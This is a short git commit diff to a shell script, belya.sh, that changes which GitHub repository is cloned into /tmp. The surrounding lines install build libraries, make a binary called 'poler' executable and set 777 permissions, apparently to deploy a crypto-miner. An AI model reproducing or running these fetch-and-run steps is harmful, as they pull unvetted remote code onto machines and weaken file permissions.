782832f946eb66d0bb52f94fe3ba6e9f5678551d
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2019-06-16 23:25:45 +0300

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -8,7 +8,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir shusstriy
-git clone https://github.com/masketteland/shusstriy.git /tmp/shusstriy
+git clone https://github.com/robbertopp1/shusstriy.git /tmp/shusstriy
 cd /tmp/shusstriy
 chmod +x /tmp/shusstriy/poler
 chmod 777 ./*.sh
